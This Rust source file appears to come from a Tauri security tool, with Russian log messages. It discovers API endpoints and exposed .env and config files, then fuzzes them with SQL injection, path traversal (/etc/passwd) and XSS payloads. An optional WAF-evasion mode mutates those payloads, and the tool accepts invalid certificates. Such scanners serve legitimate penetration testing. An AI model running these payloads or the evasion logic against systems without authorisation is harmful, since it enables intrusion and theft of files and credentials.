use reqwest::Client;
use serde::Serialize;
use std::time::Duration;
use tauri::State;
use tokio::time::{sleep, timeout};

pub async fn run_fuzzer(target_url: &str) -> Result<Option<String>, String> {
    let base_url = if !target_url.starts_with("http") {
        format!("http://{}", target_url)
    } else {
        target_url.to_string()
    };

    let client = Client::builder()
        .timeout(Duration::from_secs(3))
        // device client: self-signed certs expected on local network hardware
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    let common_paths = vec![
        "api/v1/users",
        "swagger/v1/swagger.json",
        "swagger-ui.html",
        "openapi.json",
        "api/health",
        "graphql",
        ".env",
        "config.json",
    ];

    let mut found_endpoints = Vec::new();

    for path in common_paths {
        let url = format!("{}/{}", base_url.trim_end_matches('/'), path);
        sleep(Duration::from_millis(300)).await;
        if let Ok(response) = client.get(&url).send().await {
            let status = response.status();
            if status.is_success() || status == reqwest::StatusCode::UNAUTHORIZED {
                found_endpoints.push(format!("/{} ({})", path, status));
            }
        }
    }

    if found_endpoints.is_empty() {
        Ok(None)
    } else {
        Ok(Some(found_endpoints.join(", ")))
    }
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct FuzzFinding {
    pub endpoint: String,
    pub mutation_type: String,
    pub payload: String,
    pub status_code: u16,
    pub indicator: String,
    pub baseline_len: usize,
    pub response_len: usize,
}

#[tauri::command]
pub async fn smart_fuzz_api(
    target_url: String,
    use_evasion: bool,
    log_state: State<'_, crate::LogState>,
) -> Result<Vec<FuzzFinding>, String> {
    let base_url = if !target_url.starts_with("http") {
        format!("http://{}", target_url)
    } else {
        target_url
    };

    crate::push_runtime_log(
        &log_state,
        format!(
            "🧪 Smart Fuzzer: цель {}, WAF Evasion: {}",
            base_url, use_evasion
        ),
    );

    let client = Client::builder()
        .timeout(Duration::from_secs(5))
        // device client: self-signed certs expected on local network hardware
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    let mut endpoints = vec![
        "api/v1/users".to_string(),
        "api/health".to_string(),
        "graphql".to_string(),
    ];

    if let Ok(mut sw) = discover_swagger_endpoints(&client, &base_url).await {
        endpoints.append(&mut sw);
    }

    endpoints.sort();
    endpoints.dedup();

    let sqli_bases = ["' OR '1'='1", "1' ORDER BY 1--", "' UNION SELECT null--"];
    let lfi_bases = [
        "../../../etc/passwd",
        "..\\..\\windows\\win.ini",
        "....//....//etc/passwd",
    ];
    let xss_bases = [
        "<script>alert(1)</script>",
        "\" onmouseover=alert(1) x=\"",
        "<img src=x onerror=alert(1)>",
    ];

    let mut findings = Vec::new();

    for ep in endpoints {
        let url = format!(
            "{}/{}",
            base_url.trim_end_matches('/'),
            ep.trim_start_matches('/')
        );

        let baseline = timeout(Duration::from_secs(6), client.get(&url).send())
            .await
            .ok()
            .and_then(|r| r.ok());
        let baseline_len = if let Some(resp) = baseline {
            resp.text().await.unwrap_or_default().len()
        } else {
            0
        };

        for base in sqli_bases {
            let mut detected = false;
            for payload in crate::fuzzer::generate_evasion_payloads(base, use_evasion) {
                sleep(Duration::from_millis(180)).await;
                let fuzz_url = format!(
                    "{}?id={}&user={}",
                    url,
                    urlencoding::encode(&payload),
                    urlencoding::encode(&payload)
                );

                if let Ok(Ok(response)) =
                    timeout(Duration::from_secs(6), client.get(&fuzz_url).send()).await
                {
                    let status = response.status().as_u16();
                    let body = response.text().await.unwrap_or_default();
                    let response_len = body.len();
                    let body_low = body.to_lowercase();

                    if body_low.contains("sql syntax")
                        || body_low.contains("mysql_fetch")
                        || body_low.contains("ora-")
                        || body_low.contains("syntax error")
                        || body_low.contains("mysql")
                    {
                        crate::push_runtime_log(
                            &log_state,
                            format!("🚨 ПРОБИТИЕ WAF (SQLi): Пейлоад [{}] сработал!", payload),
                        );
                        findings.push(FuzzFinding {
                            endpoint: ep.clone(),
                            mutation_type: "sql_injection".to_string(),
                            payload,
                            status_code: status,
                            indicator: "sql injection indicator".to_string(),
                            baseline_len,
                            response_len,
                        });
                        detected = true;
                        break;
                    }
                }
            }
            if detected {
                break;
            }
        }

        for base in lfi_bases {
            let mut detected = false;
            for payload in crate::fuzzer::generate_evasion_payloads(base, use_evasion) {
                sleep(Duration::from_millis(180)).await;
                let fuzz_url = format!("{}?file={}", url, urlencoding::encode(&payload));

                if let Ok(Ok(response)) =
                    timeout(Duration::from_secs(6), client.get(&fuzz_url).send()).await
                {
                    let status = response.status().as_u16();
                    let body = response.text().await.unwrap_or_default();
                    let response_len = body.len();
                    let body_low = body.to_lowercase();

                    if body.contains("root:x:0:0") || body_low.contains("[extensions]") {
                        crate::push_runtime_log(
                            &log_state,
                            format!("🚨 ПРОБИТИЕ WAF (LFI): Пейлоад [{}] сработал!", payload),
                        );
                        findings.push(FuzzFinding {
                            endpoint: ep.clone(),
                            mutation_type: "path_traversal".to_string(),
                            payload,
                            status_code: status,
                            indicator: "path traversal confirmed".to_string(),
                            baseline_len,
                            response_len,
                        });
                        detected = true;
                        break;
                    }
                }
            }
            if detected {
                break;
            }
        }

        for base in xss_bases {
            let mut detected = false;
            for payload in crate::fuzzer::generate_evasion_payloads(base, use_evasion) {
                sleep(Duration::from_millis(180)).await;
                let fuzz_url = format!("{}?q={}", url, urlencoding::encode(&payload));

                if let Ok(Ok(response)) =
                    timeout(Duration::from_secs(6), client.get(&fuzz_url).send()).await
                {
                    let status = response.status().as_u16();
                    let body = response.text().await.unwrap_or_default();
                    let response_len = body.len();
                    let body_low = body.to_lowercase();

                    let reflected = body.contains(&payload)
                        || body_low.contains("<script>alert(1)</script>")
                        || body_low.contains("onerror=alert(1)")
                        || (baseline_len > 0
                            && response_len.abs_diff(baseline_len) > (baseline_len / 2));

                    if reflected {
                        crate::push_runtime_log(
                            &log_state,
                            format!("🚨 ПРОБИТИЕ WAF (XSS): Пейлоад [{}] сработал!", payload),
                        );
                        findings.push(FuzzFinding {
                            endpoint: ep.clone(),
                            mutation_type: "xss_probe".to_string(),
                            payload,
                            status_code: status,
                            indicator: "xss/reflection indicator".to_string(),
                            baseline_len,
                            response_len,
                        });
                        detected = true;
                        break;
                    }
                }
            }
            if detected {
                break;
            }
        }
    }

    crate::push_runtime_log(
        &log_state,
        format!("[SMART_FUZZ] findings {}", findings.len()),
    );

    Ok(findings)
}

async fn discover_swagger_endpoints(
    client: &Client,
    base_url: &str,
) -> Result<Vec<String>, String> {
    let paths = ["swagger.json", "openapi.json", "v2/api-docs"];
    for p in paths {
        let url = format!("{}/{}", base_url.trim_end_matches('/'), p);
        let resp = match timeout(Duration::from_secs(5), client.get(&url).send()).await {
            Ok(Ok(r)) => r,
            _ => continue,
        };
        if !resp.status().is_success() {
            continue;
        }

        let json: serde_json::Value = resp.json().await.map_err(|e| e.to_string())?;
        let mut out = Vec::new();
        if let Some(obj) = json["paths"].as_object() {
            for key in obj.keys() {
                out.push(key.trim_start_matches('/').to_string());
            }
        }
        if !out.is_empty() {
            return Ok(out);
        }
    }
    Ok(Vec::new())
}

#[tauri::command]
pub async fn run_api_fuzzer(ip: String) -> Result<String, String> {
    match run_fuzzer(&ip).await? {
        Some(findings) => Ok(format!("[API_FUZZER] Найдены эндпоинты: {}", findings)),
        None => Ok("[API_FUZZER] Эндпоинты не обнаружены".to_string()),
    }
}
